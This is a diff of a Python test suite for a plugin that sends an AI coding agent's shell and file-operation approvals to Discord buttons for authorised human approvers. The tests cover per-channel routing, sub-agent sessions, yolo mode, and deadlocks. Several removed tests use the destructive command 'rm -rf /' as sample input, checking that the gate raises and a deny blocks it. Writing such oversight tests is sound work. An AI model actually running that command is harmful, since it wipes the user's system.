-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
+def test_ac39_the_loser_gets_told_and_resolves_nothing_twice(
+    authz_db, prompts, discord
+):
+    result, done, _ = backend_in_thread()
+    wait_for_prompt().answer(True)
+    assert done.wait(5)
 
-    # Called directly (not via to_thread) => we ARE on the gateway loop.
-    result = approvals.approval_backend(session_id, "File Operation", "write", None)
-
-    assert result == (False, None)
-    assert client.channels[CHANNEL_A].sent == [], "must not even open a gate"
-
-
-# --------------------------------------------------------------------------- #
-# AC-27 — every failure path ends in (False, None)
-# --------------------------------------------------------------------------- #
-
-
-async def test_ac27_missing_session_denies(client):
-    approvals.install()
-    result = await asyncio.to_thread(
-        approvals.approval_backend, None, "File Operation", "write", None
+    late = approvals.on_gate_resolved(
+        gate_id=discord.submitted[0]["gate_id"],
+        decision=approvals_ui.DECISION_DENY,
+        discord_user_id=APPROVER_ID,
     )
-    assert result == (False, None)
+
+    assert late is not None
+    assert result["value"] == (True, None)
 
 
-async def test_ac27_unattributable_session_denies(client):
-    """A sid that is not a Discord session can never be routed (INV-3)."""
-    approvals.install()
-    result = await asyncio.to_thread(
-        approvals.approval_backend, "Shell Command", "x", "y", None
+# --------------------------------------------------------------------------- #
+# AC-72 / AC-76b / INV-C24 — reporting and the SIGINT flag
+# --------------------------------------------------------------------------- #
+
+
+def test_ac72_an_open_gate_is_reported_as_blocked(authz_db, prompts, discord):
+    mailbox = reporter.Mailbox()
+    state = reporter.StateReporter(mailbox)
+    approvals.set_reporter(state)
+    state.on_run_start()
+
+    result, done, _ = backend_in_thread()
+    wait_for_prompt()
+    time.sleep(0.05)
+
+    assert state.state == reporter.BLOCKED
+
+    wait_for_prompt().answer(True)
+    done.wait(5)
+    assert state.state == reporter.WORKING
+
+
+def test_ac76b_the_core_flag_is_set_around_the_terminal_branch(
+    authz_db, prompts, discord, clean_state
+):
+    """Without it a Ctrl+C kills the whole run (``_runtime.py:957,969``)."""
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    assert ("flag", True) in clean_state
+
+    prompt.answer(True)
+    done.wait(5)
+    assert clean_state[-1] == ("flag", False)
+
+
+def test_ac87a_the_flag_only_drops_when_the_LAST_branch_ends(
+    authz_db, prompts, discord, clean_state
+):
+    first_result, first_done, _ = backend_in_thread()
+    first = wait_for_prompt(0)
+    assert first.running.wait(5)
+    approvals._flag_step(+1)  # a second waiter, as a concurrent approval would
+
+    first.answer(True)
+    assert first_done.wait(5)
+
+    assert ("flag", False) not in clean_state, "the flag dropped with one branch live"
+    approvals._flag_step(-1)
+    assert clean_state[-1] == ("flag", False)
+
+
+def test_ac87b_a_stale_setter_call_is_discarded(clean_state):
+    """Idempotent is NOT order-independent -- hence the generation counter."""
+    approvals._flag_step(+1)
+    stale_gen = approvals.flag_generation()
+    clean_state.clear()
+
+    approvals._flag_step(-1)
+    approvals._flag_step(+1)
+    clean_state.clear()
+
+    approvals._apply_flag(stale_gen, False)
+
+    assert clean_state == [], "a stale False cleared the flag under a live prompt"
+
+
+def test_ac87c_the_flag_is_never_set_under_the_state_lock(clean_state):
+    """Foreign plugins run synchronously inside the core setter."""
+    seen = []
+
+    def observe(value):
+        seen.append(approvals.state_lock_held_by_me())
+
+    approvals._set_core_flag = observe
+    try:
+        approvals._flag_step(+1)
+        approvals._flag_step(-1)
+    finally:
+        approvals._set_core_flag = lambda value: clean_state.append(("flag", value))
+
+    assert seen == [False, False]
+
+
+# --------------------------------------------------------------------------- #
+# AC-84 / AC-80 — no deadlock on the main path
+# --------------------------------------------------------------------------- #
+
+
+def test_ac84_resolution_runs_through_while_the_backend_waits(
+    authz_db, prompts, discord
+):
+    """P13: the backend is parked in step 3; a foreign thread must not block."""
+    result, done, _ = backend_in_thread()
+    prompt = wait_for_prompt()
+    assert prompt.running.wait(5)
+
+    started = time.monotonic()
+    approvals.on_gate_resolved(
+        gate_id=discord.submitted[0]["gate_id"],
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
     )
-    assert result == (False, None)
+    elapsed = time.monotonic() - started
+
+    assert elapsed < 0.1, "on_gate_resolved waited on a lock the backend holds"
+    assert done.wait(5)
 
 
-async def test_ac27_session_without_a_principal_denies(client):
-    """No owner -> ``authz.open_gate`` refuses -> the gate is never posed."""
-    approvals.install()
-    result = await asyncio.to_thread(
-        approvals.approval_backend,
-        gateway.session_id_for(CHANNEL_A),
-        "File Operation",
-        "write",
-        None,
+def test_ac80_two_concurrent_approvals_never_show_two_prompts(
+    authz_db, prompts, discord
+):
+    first_result, first_done, _ = backend_in_thread("Shell Command", "one")
+    first = wait_for_prompt(0)
+    assert first.running.wait(5)
+
+    second_result, second_done, _ = backend_in_thread("File Operation", "two")
+    gate_ids = []
+    deadline = time.monotonic() + 5
+    while time.monotonic() < deadline and len(approvals.open_gates()) < 2:
+        time.sleep(0.01)
+    gate_ids = approvals.open_gates()
+
+    assert len(gate_ids) == 2, "the second approval never opened a gate"
+    assert len(FakePrompt.instances) == 1, "two prompts fought over one stdin"
+
+    # The second one is answerable the whole time -- from the phone.
+    second_gate = [
+        entry["gate_id"] for entry in discord.submitted if entry["body"] == "two"
+    ][0]
+    approvals.on_gate_resolved(
+        gate_id=second_gate,
+        decision=approvals_ui.DECISION_APPROVE,
+        discord_user_id=APPROVER_ID,
     )
-    assert result == (False, None)
-    assert client.channels[CHANNEL_A].sent == []
+    assert second_done.wait(5)
+    assert second_result["value"] == (True, None)
 
-
-async def test_ac27_exception_while_posting_denies(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-    client.channels[CHANNEL_A].send_error = RuntimeError("discord is down")
-
-    result = await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    )
-    assert result == (False, None)
-
-
-async def test_ac27_timeout_denies(client, monkeypatch):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
-    approvals.install()
-
-    result = await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    )
-    assert result == (False, None)
-
-
-async def test_ac27_no_client_denies():
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    gateway.set_connection(None, asyncio.get_running_loop())
-    approvals.install()
-
-    result = await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    )
-    assert result == (False, None)
-
-
-async def test_ac27_no_loop_denies():
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    gateway.set_connection(FakeClient(CHANNEL_A), None)
-    approvals.install()
-
-    result = await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    )
-    assert result == (False, None)
+    first.answer(False)
+    assert first_done.wait(5)
+    assert first_result["value"] == (False, None)
 
 
 # --------------------------------------------------------------------------- #
-# AC-28 — ask_user_question is blocked with a model-steering message
+# AC-69 / AC-91 — a wait the phone cannot answer says so
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac28_ask_user_question_is_blocked():
-    approvals.install()
-    result = await approvals.on_pre_tool_call("ask_user_question", {})
+def test_ac69_an_approval_gate_is_marked_remotely_resolvable(
+    authz_db, prompts, discord
+):
+    result, done, _ = backend_in_thread()
+    wait_for_prompt()
 
-    assert result["blocked"] is True
-    assert "[BLOCKED]" in result["error_message"]
-    assert "discord" in result["error_message"].lower()
+    assert discord.submitted[0]["remote_resolvable"] is True
 
-
-async def test_ac28_other_tools_are_not_blocked():
-    approvals.install()
-    assert await approvals.on_pre_tool_call("read_file", {"file_path": "x"}) is None
-
-
-async def test_ac28_hook_is_registered_on_the_pre_tool_call_phase():
-    from code_puppy.callbacks import get_callbacks
-
-    approvals.install()
-    assert approvals.on_pre_tool_call in get_callbacks("pre_tool_call")
+    wait_for_prompt().answer(True)
+    done.wait(5)
 
 
 # --------------------------------------------------------------------------- #
-# AC-37 — the backend really SEES the session id (via L1 patch C)
+# AC-61 — ask_user_question has no answer path over Discord (INV-C16)
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac37_patch_c_binds_the_session_the_backend_receives(client):
-    """End to end through the REAL patch C, not a hand-made closure."""
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _own(CHANNEL_B, ALICE)
-    approvals.install()
-    concurrency.install()
-    try:
-        from code_puppy.tools.common import get_approval_backend
+def pre_tool_call(tool_name, args=None):
+    """Drive the hook synchronously -- the suite needs no async plugin for it."""
+    return asyncio.run(approvals.on_pre_tool_call(tool_name, args or {}))
 
-        with concurrency.session_scope(gateway.session_id_for(CHANNEL_B)):
-            bound = get_approval_backend()  # resolved ON the loop, as common.py does
 
-        # The core calls the bound closure with THREE args; the id rides along.
-        gate = asyncio.ensure_future(
-            asyncio.to_thread(bound, "File Operation", "write to b.py", None)
-        )
-        await _approve(client.channels[CHANNEL_B], ALICE_DISCORD_ID)
-        assert await gate == (True, None)
-    finally:
-        concurrency.uninstall()
+def test_ac61_ask_user_question_is_blocked(discord):
+    blocked = pre_tool_call("ask_user_question")
 
-    # The proof: it landed in B's channel, nowhere else.
-    assert len(client.channels[CHANNEL_B].sent) == 1
-    assert client.channels[CHANNEL_A].sent == []
+    assert blocked is not None
+    assert blocked["blocked"] is True
+    assert "Discord" in blocked["error_message"]
+
+
+def test_ac61_other_tools_are_untouched(discord):
+    assert pre_tool_call("run_shell_command") is None
+
+
+def test_ac61_without_a_broker_nothing_is_blocked(monkeypatch):
+    """INV-C19: with no Discord the session behaves exactly as without us."""
+    monkeypatch.setattr(approvals, "_active_client", lambda: None)
+
+    assert pre_tool_call("ask_user_question") is None
 
 
 # --------------------------------------------------------------------------- #
-# AC-39a / AC-39b / AC-52 — yolo_mode does not apply over Discord
+# AC-83b — the readers import the SHARED constant
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac39a_shell_gate_is_raised_even_with_yolo_on(client, monkeypatch):
-    monkeypatch.setattr(authz, "get_yolo_mode", lambda: True)
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
+def _authz_callers():
+    """Modules that CALL an authorization lookup -- not the ones defining it.
 
-    with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-        _own(CHANNEL_A, ALICE)
-        hook = asyncio.ensure_future(
-            approvals.on_run_shell_command(None, "rm -rf /", None, 60)
-        )
-        await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-        assert (await hook)["blocked"] is True
-
-
-async def test_ac39b_file_gate_is_raised_even_with_yolo_on(client, monkeypatch):
-    """With yolo on the core handler returns before the backend is reached.
-
-    ``file_permission_handler/register_callbacks.py:466`` short-circuits, so
-    without our own callback the file edge would be wide open.
+    An AST walk rather than a substring search: ``bindings.py`` and
+    ``authz.py`` contain those names because they DEFINE them, and a text
+    match would demand the constant from the very module the constant is
+    about.
     """
-    monkeypatch.setattr(authz, "get_yolo_mode", lambda: True)
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
+    import ast
+    from pathlib import Path
 
-    with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-        _own(CHANNEL_A, ALICE)
-        hook = asyncio.ensure_future(
-            approvals.on_file_permission(None, "x.py", "write", None, None, None)
-        )
-        await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-        assert await hook is False
-
-    assert len(client.channels[CHANNEL_A].sent) == 1
-
-
-async def test_ac52_file_callback_abstains_while_yolo_is_off(client, monkeypatch):
-    """Tri-state: ``None`` = no opinion, so exactly ONE gate per operation.
-
-    Every registered callback runs (``callbacks.py:304-327``); an always-on
-    callback would ask twice for the same file operation.
-    """
-    monkeypatch.setattr(authz, "get_yolo_mode", lambda: False)
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
-
-    with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-        _own(CHANNEL_A, ALICE)
-        result = await approvals.on_file_permission(
-            None, "x.py", "write", None, None, None
-        )
-
-    assert result is None
-    assert client.channels[CHANNEL_A].sent == [], "the backend alone raises the gate"
+    wanted = {"resolve_principal", "check_message", "has_role"}
+    callers = []
+    for path in Path(__file__).resolve().parents[1].glob("*.py"):
+        source = path.read_text(encoding="utf-8")
+        tree = ast.parse(source)
+        defined = {
+            node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)
+        }
+        calls = {
+            node.func.attr
+            for node in ast.walk(tree)
+            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
+        }
+        if calls & wanted and not (defined & wanted):
+            callers.append((path, source, tree))
+    return callers
 
 
-async def test_ac52_file_callback_is_registered_on_the_file_permission_phase():
-    from code_puppy.callbacks import get_callbacks
+def test_ac83b_the_gate_path_uses_the_shared_authz_channel():
+    import ast
 
-    approvals.install()
-    assert approvals.on_file_permission in get_callbacks("file_permission")
+    callers = _authz_callers()
 
-
-# --------------------------------------------------------------------------- #
-# AC-40 — sub-agent shell is gated, in the TRIGGERING channel
-# --------------------------------------------------------------------------- #
-
-
-async def test_ac40_subagent_shell_is_gated_in_the_triggering_channel(client):
-    """A sub-agent runs under its OWN session id, not the channel's.
-
-    Measured: ``subagent_invocation.py:310`` calls ``set_session_context`` with
-    a freshly generated child id, which L1 patch A2-set mirrors into the
-    Discord ContextVar.  The gate must still reach the channel that triggered
-    the run, checked against THAT channel's principal (L3/R5).
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
-    concurrency.install()
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-            _own(CHANNEL_A, ALICE)
-            # The parent agent calls invoke_agent: a tool call like any other.
-            await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-
-            async def subagent_turn():
-                sai.set_session_context("qa-expert-session-a3f2b1")
-                assert concurrency.current_session_id() == "qa-expert-session-a3f2b1", (
-                    "probe assumption: the child sid really does take over"
-                )
-                await approvals.on_pre_tool_call("run_shell_command", {})
-                return await approvals.on_run_shell_command(None, "rm -rf /", None, 60)
-
-            task = asyncio.ensure_future(subagent_turn())
-            await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-            assert (await task)["blocked"] is True
-    finally:
-        concurrency.uninstall()
-
-    assert len(client.channels[CHANNEL_A].sent) == 1
+    assert callers, "no authorization reader found at all"
+    for path, source, tree in callers:
+        assert "AUTHZ_CHANNEL" in source, f"{path.name} does not use the constant"
+        literals = [
+            node.value
+            for node in ast.walk(tree)
+            if isinstance(node, ast.Constant) and node.value == "discord"
+        ]
+        assert literals == [], f"{path.name} carries a second 'discord' literal"
 
 
-async def test_ac40_subagent_file_approval_reaches_the_triggering_channel(client):
-    """The backend runs in an executor thread, where no ContextVar is visible.
+def test_ac83b_the_reader_set_includes_the_gate_path():
+    """The AC is a CROSS check; a filter that found nobody would pass vacuously."""
+    names = {path.name for path, _source, _tree in _authz_callers()}
 
-    So the shell hook's in-context fallback cannot help here: patch C binds the
-    CHILD session id on the loop and hands it over the thread boundary (INV-6).
-    Without an explicit child -> origin record the id is unroutable and every
-    sub-agent file operation is refused -- fail-closed, but requirement (2)
-    silently dead for sub-agents.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    approvals.install()
-    concurrency.install()
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-        from code_puppy.tools.common import get_approval_backend
-
-        child_sid = "qa-expert-session-c4e2f1"
-        with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-            _own(CHANNEL_A, ALICE)
-            await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-
-            async def subagent_turn():
-                sai.set_session_context(child_sid)
-                await approvals.on_pre_tool_call("create_file", {"file_path": "x"})
-                # Resolved ON the loop, exactly as common.py:1442 does.
-                bound = get_approval_backend()
-                return await asyncio.to_thread(bound, "File Operation", "write", None)
-
-            task = asyncio.ensure_future(subagent_turn())
-            await _approve(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-            assert await task == (True, None)
-    finally:
-        concurrency.uninstall()
-
-    assert len(client.channels[CHANNEL_A].sent) == 1
-
-
-async def test_ac40_subagent_gate_is_checked_against_the_triggering_principal(client):
-    """Bob may approve in general, but did not trigger THIS run (R1)."""
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _approver(BOB_DISCORD_ID, BOB)
-    approvals.install()
-    concurrency.install()
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        with concurrency.session_scope(gateway.session_id_for(CHANNEL_A)):
-            _own(CHANNEL_A, ALICE)  # Alice triggered the run
-            await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-
-            async def subagent_turn():
-                sai.set_session_context("qa-expert-session-b7c1d9")
-                await approvals.on_pre_tool_call("run_shell_command", {})
-                return await approvals.on_run_shell_command(None, "rm -rf /", None, 60)
-
-            task = asyncio.ensure_future(subagent_turn())
-            message = await _wait_for_gate(client.channels[CHANNEL_A])
-
-            bob = await _click(message, approvals.APPROVE_LABEL, BOB_DISCORD_ID)
-            assert bob.response.ephemeral, "Bob must be refused, not silently ignored"
-            assert not task.done(), "an outsider's click must not resolve the gate"
-
-            await _click(message, approvals.DENY_LABEL, ALICE_DISCORD_ID)
-            assert (await task)["blocked"] is True
-    finally:
-        concurrency.uninstall()
+    assert "approvals.py" in names
 
 
 # --------------------------------------------------------------------------- #
-# AC-40 — a child session id that TWO channels use must not cross channels
+# The sentinel: a double load must be LOUD (self-protection)
 # --------------------------------------------------------------------------- #
 
 
-async def test_ac40_two_channels_sharing_a_child_session_id_gate_separately(client):
-    """One child session id, two channels -> each gate stays in ITS channel.
-
-    ``session_id`` is a model-visible parameter of ``invoke_agent`` and is taken
-    verbatim once the session has history (``subagent_invocation.py:290``), and
-    the auto-generated ids are a 6-character sha1 slice -- so two channels can
-    genuinely end up with the same child id.  Resolving it through the
-    process-wide origin map instead of the context-local one posts Bob's
-    ``rm -rf /`` into ALICE's channel, to be approved by Alice.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _approver(BOB_DISCORD_ID, BOB)
-    approvals.install()
-    concurrency.install()
-    shared_child = "shared-review-session"
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        async def turn(channel_id: int, principal: str):
-            with concurrency.session_scope(gateway.session_id_for(channel_id)):
-                _own(channel_id, principal)
-                await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-                sai.set_session_context(shared_child)
-                await approvals.on_pre_tool_call("run_shell_command", {})
-                return await approvals.on_run_shell_command(None, "rm -rf /", None, 60)
-
-        # Each turn is its own task, so each gets its own context copy -- which
-        # is exactly the state a real per-channel run has.
-        alice_turn = asyncio.ensure_future(turn(CHANNEL_A, ALICE))
-        await _wait_for_gate(client.channels[CHANNEL_A])
-        bob_turn = asyncio.ensure_future(turn(CHANNEL_B, BOB))
-        await _wait_for_gate(client.channels[CHANNEL_B])
-
-        assert len(client.channels[CHANNEL_A].sent) == 1, "a foreign gate leaked in"
-        assert len(client.channels[CHANNEL_B].sent) == 1
-
-        await _deny(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-        await _deny(client.channels[CHANNEL_B], BOB_DISCORD_ID)
-        assert (await alice_turn)["blocked"] is True
-        assert (await bob_turn)["blocked"] is True
-    finally:
-        concurrency.uninstall()
-
-
-async def test_ac40_the_context_local_origin_outranks_the_shared_map(client):
-    """The ContextVar wins over the map -- ORDER, isolated from ambiguity.
-
-    Measured shape of the defect: with a stale foreign claim on the child id in
-    the shared map, asking the map FIRST posts this channel's gate into the
-    other channel and checks it against the other channel's principal.  Here
-    only ONE claimant exists, so the ambiguity guard cannot mask the ordering:
-    the answer must come from Bob's context, not from Alice's stale claim.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _approver(BOB_DISCORD_ID, BOB)
-    approvals.install()
-    concurrency.install()
-    shared_child = "shared-review-session"
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        # Alice's run claimed the id earlier and is the map's only entry.
-        _own(CHANNEL_A, ALICE)
-        approvals._remember_origin(shared_child, gateway.session_id_for(CHANNEL_A))
-
-        async def bob_turn():
-            with concurrency.session_scope(gateway.session_id_for(CHANNEL_B)):
-                _own(CHANNEL_B, BOB)
-                await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-                sai.set_session_context(shared_child)
-                return await approvals.on_run_shell_command(None, "rm -rf /", None, 60)
-
-        task = asyncio.ensure_future(bob_turn())
-        message = await _wait_for_gate(client.channels[CHANNEL_B])
-
-        assert client.channels[CHANNEL_A].sent == [], "the gate went to Alice"
-        # ...and against BOB's principal: Alice must not be able to answer it.
-        alice = await _click(message, approvals.APPROVE_LABEL, ALICE_DISCORD_ID)
-        assert alice.response.ephemeral, "Alice could answer Bob's gate"
-        assert not task.done()
-
-        await _click(message, approvals.DENY_LABEL, BOB_DISCORD_ID)
-        assert (await task)["blocked"] is True
-    finally:
-        concurrency.uninstall()
-
-
-async def test_ac40_a_child_id_claimed_by_two_channels_is_refused(client, monkeypatch):
-    """The executor-side backend has ONLY the shared map -- so it must refuse.
-
-    No ContextVar crosses into the pool thread (INV-6), so when two channels
-    both claim one child id the map cannot say whose operation this is.
-    Last-writer-wins would only swap the victim.  Unattributable means refused
-    (INV-3): a gate nobody can be held to is not a gate.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _approver(BOB_DISCORD_ID, BOB)
-    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
-    approvals.install()
-    concurrency.install()
-    shared_child = "shared-review-session"
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        async def claim(channel_id: int, principal: str) -> None:
-            with concurrency.session_scope(gateway.session_id_for(channel_id)):
-                _own(channel_id, principal)
-                await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-                sai.set_session_context(shared_child)
-                await approvals.on_pre_tool_call("create_file", {"file_path": "x"})
-
-        await asyncio.ensure_future(claim(CHANNEL_A, ALICE))
-        await asyncio.ensure_future(claim(CHANNEL_B, BOB))
-
-        result = await asyncio.to_thread(
-            approvals.approval_backend, shared_child, "File Operation", "write", None
-        )
-    finally:
-        concurrency.uninstall()
-
-    assert result == (False, None)
-    assert client.channels[CHANNEL_A].sent == [], "a foreign channel was gated"
-    assert client.channels[CHANNEL_B].sent == []
-
-
-async def test_ac40_releasing_a_session_frees_its_child_id_for_another_channel(client):
-    """A finished turn gives its child ids back, so reuse stays attributable.
-
-    Without the release the id would stay claimed by a channel that is no
-    longer running and every later reuse would be refused as ambiguous.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _approver(BOB_DISCORD_ID, BOB)
-    approvals.install()
-    concurrency.install()
-    shared_child = "shared-review-session"
-    try:
-        import code_puppy.tools.subagent_invocation as sai
-
-        async def claim(channel_id: int, principal: str) -> None:
-            with concurrency.session_scope(gateway.session_id_for(channel_id)):
-                _own(channel_id, principal)
-                await approvals.on_pre_tool_call("invoke_agent", {"agent_name": "qa"})
-                sai.set_session_context(shared_child)
-                await approvals.on_pre_tool_call("create_file", {"file_path": "x"})
-
-        await asyncio.ensure_future(claim(CHANNEL_A, ALICE))
-        approvals.release_session(gateway.session_id_for(CHANNEL_A))
-        await asyncio.ensure_future(claim(CHANNEL_B, BOB))
-
-        gate = asyncio.ensure_future(
-            asyncio.to_thread(
-                approvals.approval_backend,
-                shared_child,
-                "File Operation",
-                "write",
-                None,
-            )
-        )
-        await _approve(client.channels[CHANNEL_B], BOB_DISCORD_ID)
-        assert await gate == (True, None)
-    finally:
-        concurrency.uninstall()
-
-    assert client.channels[CHANNEL_A].sent == []
-
-
-def test_gateway_reset_state_clears_the_child_session_map(monkeypatch):
-    """Shutdown must forget child claims too, or they outlive their run."""
-    monkeypatch.setattr(gateway, "_new_agent", lambda: object())
-    session_id = gateway.session_id_for(CHANNEL_A)
-    gateway._channel_for(CHANNEL_A)
-    approvals._remember_origin("child-a1", session_id)
-    assert approvals.subagent_origins() == {"child-a1": {session_id}}
-
-    gateway.reset_state()
-
-    assert approvals.subagent_origins() == {}
-
-
-def test_release_session_leaves_another_channels_claims_alone():
-    """Releasing one run must not disarm a channel that is still running."""
-    session_a = gateway.session_id_for(CHANNEL_A)
-    session_b = gateway.session_id_for(CHANNEL_B)
-    approvals._remember_origin("child-a1", session_a)
-    approvals._remember_origin("child-b1", session_b)
-
-    approvals.release_session(session_a)
-
-    assert approvals.subagent_origins() == {"child-b1": {session_b}}
-
-
 # --------------------------------------------------------------------------- #
-# AC-41 — the one-slot backend global is treated defensively (INV-5)
+# The handover that makes the Discord branch EXIST
 # --------------------------------------------------------------------------- #
 
 
-def test_ac41_a_foreign_backend_is_not_overwritten():
+class RecordingClient(FakeClient):
+    """A client that remembers who was pointed at its inbound listener."""
+
+    def __init__(self):
+        super().__init__()
+        self.handler = "never set"
+
+    def set_resolution_handler(self, handler):
+        self.handler = handler
+
+
+def test_install_points_the_return_channel_at_us(authz_db, monkeypatch):
+    """Without this ONE line every click is refused with ``no_handler``.
+
+    And nothing else notices: every test in this file drives
+    ``on_gate_resolved`` directly, so all of them stay green while the plugin
+    is deaf in production.  Found by deleting the line and watching 423 tests
+    pass.
+    """
+    client = RecordingClient()
+    monkeypatch.setattr(approvals, "_active_client", lambda: client)
+
+    approvals.install()
+    try:
+        assert client.handler is approvals.on_gate_resolved
+    finally:
+        approvals.uninstall()
+
+    assert client.handler is None, "teardown left a handler on a dead backend"
+
+
+def test_install_without_a_broker_is_harmless(authz_db, monkeypatch):
+    monkeypatch.setattr(approvals, "_active_client", lambda: None)
+
+    approvals.install()
+    approvals.uninstall()
+
+
+def test_installing_over_a_stranger_refuses_loudly(authz_db):
     from code_puppy.tools.common import get_approval_backend, set_approval_backend
 
-    def foreign(title, message, preview):  # ACP's 3-arg shape
-        return True, None
+    def stranger(title, message, preview):  # pragma: no cover - never called
+        return False, None
 
-    set_approval_backend(foreign)
+    set_approval_backend(stranger)
     try:
         with pytest.raises(approvals.ApprovalError):
             approvals.install()
-        assert get_approval_backend() is foreign, "the other frontend stays live"
+        assert get_approval_backend() is stranger
     finally:
         set_approval_backend(None)
 
 
-def test_ac41_uninstall_restores_the_previous_state():
-    from code_puppy.tools.common import get_approval_backend
-
-    assert get_approval_backend() is None
-    approvals.install()
-    assert get_approval_backend() is approvals.approval_backend
-    approvals.uninstall()
-    assert get_approval_backend() is None
-
-
-def test_ac41_uninstall_removes_every_hook():
-    from code_puppy.callbacks import get_callbacks
-
-    approvals.install()
-    approvals.uninstall()
-
-    assert approvals.on_run_shell_command not in get_callbacks("run_shell_command")
-    assert approvals.on_file_permission not in get_callbacks("file_permission")
-    assert approvals.on_pre_tool_call not in get_callbacks("pre_tool_call")
-
-
-def test_ac41_install_is_idempotent():
-    approvals.install()
-    approvals.install()  # must not raise on its OWN backend
-
-    from code_puppy.callbacks import get_callbacks
-
-    assert get_callbacks("run_shell_command").count(approvals.on_run_shell_command) == 1
-
-
-def test_ac41_uninstall_is_idempotent():
-    approvals.install()
-    approvals.uninstall()
-    approvals.uninstall()
-
-
-def test_ac41_reinstall_over_our_own_patched_getter_is_silent():
-    """INV-7 clause 1: patch C's closure inherits the sentinel.
-
-    Without that, the slot check would see a foreign-looking closure and refuse
-    to reinstall -- AC-41 green, requirement (2) dead.
-    """
-    approvals.install()
-    concurrency.install()
-    try:
-        approvals.install()  # patch C now sits in front of the getter
-    finally:
-        concurrency.uninstall()
-
-
-# --------------------------------------------------------------------------- #
-# AC-61 — a foreign backend is passed through, never wrapped
-# --------------------------------------------------------------------------- #
-
-
-def test_ac61_patch_c_passes_a_foreign_backend_through_unchanged():
+def test_installing_twice_is_idempotent(authz_db):
     from code_puppy.tools.common import get_approval_backend, set_approval_backend
 
-    def foreign(title, message, preview):
-        return True, "ok"
-
-    set_approval_backend(foreign)
-    concurrency.install()
+    approvals.install()
     try:
-        resolved = get_approval_backend()
-        assert resolved is foreign
-        # Called with THREE args, as the core does -- no TypeError.
-        assert resolved("t", "m", None) == (True, "ok")
+        approvals.install()
+        assert getattr(get_approval_backend(), approvals.SENTINEL, False) is True
     finally:
-        concurrency.uninstall()
+        approvals.uninstall()
+        assert get_approval_backend() is None
         set_approval_backend(None)
 
 
-# --------------------------------------------------------------------------- #
-# AC-46 / AC-47 / AC-48 — the button flow (SPEC-L4 §4.3a)
-# --------------------------------------------------------------------------- #
-
-
-async def test_ac46_an_unauthorized_click_leaves_the_gate_open(client):
-    """Bob is not even an approver; his click must change nothing."""
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _talker_only(BOB_DISCORD_ID, BOB)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    message = await _wait_for_gate(client.channels[CHANNEL_A])
-
-    bob = await _click(message, approvals.APPROVE_LABEL, BOB_DISCORD_ID)
-    assert bob.response.deferred, "Discord's 3s deadline is answered first"
-    assert bob.response.ephemeral, "the refusal is private, not a channel post"
-    assert not gate.done(), "the gate stays open"
-    assert message.edits == [], "and the message is untouched"
-
-    await _click(message, approvals.APPROVE_LABEL, ALICE_DISCORD_ID)
-    assert await gate == (True, None)
-
-
-async def test_ac46_an_unknown_clicker_leaves_the_gate_open(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
